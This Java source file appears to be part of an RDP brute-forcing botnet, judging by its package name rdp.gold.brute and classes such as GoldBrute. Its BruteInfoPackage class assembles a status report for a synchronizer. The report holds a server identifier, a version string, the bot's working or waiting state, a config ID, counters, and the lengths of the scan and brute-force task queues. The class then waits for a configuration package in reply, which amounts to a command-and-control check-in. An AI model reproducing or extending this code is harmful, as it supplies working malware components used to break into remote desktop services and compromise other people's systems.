package rdp.gold.brute.synchronizer.packages.write;

import org.apache.log4j.Logger;

import rdp.gold.brute.Config;
import rdp.gold.brute.CounterPool;
import rdp.gold.brute.pool.GoldBrute;
import rdp.gold.brute.synchronizer.SynchronizerInfo;
import rdp.gold.brute.synchronizer.packages.AbstractPackage;

public class BruteInfoPackage extends AbstractPackage implements rdp.gold.brute.synchronizer.packages.WritePackage {
    @SuppressWarnings("unused")
    private final Logger logger = Logger.getLogger(getClass());

    public BruteInfoPackage(SynchronizerInfo synchronizerInfoObject) {
        super(synchronizerInfoObject, "BruteInfoPackage");
    }

    public java.nio.ByteBuffer getPackage() throws Exception {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(Config.SERVER_IDENTIFICATOR.toString());
        stringBuilder.append(";");
        stringBuilder.append("0.3_3_4".toString());
        stringBuilder.append(";");
        stringBuilder.append((GoldBrute.getTaskBruteQueue().size() > 0) || (GoldBrute.getTaskScanQueue().size() > 0) ? "worked" : "wait");
        stringBuilder.append(";");
        stringBuilder.append(Config.CONFIG_ID.toString());
        stringBuilder.append(";");
        stringBuilder.append(CounterPool.pool.get());
        stringBuilder.append(";");
        stringBuilder.append(CounterPool.poolUsed.get());
        stringBuilder.append(";");
        stringBuilder.append(GoldBrute.getTaskScanQueue().size());
        stringBuilder.append(";");
        stringBuilder.append(GoldBrute.getTaskBruteQueue().size());

        return createPacket(stringBuilder.toString().getBytes());
    }

    public Class<?> getAwaitPackage() {
        return rdp.gold.brute.synchronizer.packages.read.ConfigPackage.class;
    }

    public Class<?> getWritePackage() {
        return null;
    }
}
